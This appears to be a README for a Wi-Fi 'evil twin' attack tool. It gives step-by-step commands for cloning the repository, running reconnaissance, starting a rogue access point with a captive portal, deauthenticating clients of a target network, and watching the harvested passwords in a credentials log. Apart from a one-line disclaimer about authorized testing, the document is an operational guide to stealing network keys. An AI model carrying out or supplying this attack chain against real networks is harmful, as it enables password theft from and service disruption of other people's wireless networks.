# eviltwin

Two-laptop evil twin chain. **Laptop A** = rogue AP + captive portal.
**Laptop B** = monitor mode + deauth. The PSK is harvested from the portal.

> For authorized security testing only. Running this against a network you
> do not own or lack written permission to test is illegal.

## Roles

| Laptop | Role | Needs |
|---|---|---|
| A | rogue AP, DHCP/DNS, portal, harvest | adapter with AP mode (built-in usually works) |
| B | recon, monitor mode, deauth | adapter with monitor + injection (USB: AR9271 / RTL8812AU) |

## Install (both laptops)

```bash
sudo apt update
sudo apt install -y hostapd dnsmasq nginx php-fpm aircrack-ng iw wireless-tools git
git clone https://github.com/salmanshariarmy/eviltwin.git
cd eviltwin
chmod +x scripts/*.sh
cp config/eviltwin.env.example config/eviltwin.env
$EDITOR config/eviltwin.env
Run order
Laptop B — recon, then fill TARGET_* in config/eviltwin.env:

bash
sudo ./scripts/recon.sh wlan0
Laptop A — start the rogue AP + portal:

bash
sudo ./scripts/laptop-a-ap.sh
Laptop B — start deauth:

bash
sudo ./scripts/laptop-b-attack.sh
Laptop A — watch the harvest:

bash
sudo tail -f /tmp/eviltwin/creds.log
Ctrl-C on each laptop to teardown.

Verify before the real run
Laptop B: sudo iw dev wlan0 scan | grep -i "$TARGET_SSID" → rogue SSID visible

Phone: join rogue SSID → captive portal pops → submit dummy password → appears in creds.log

Only then start deauth.
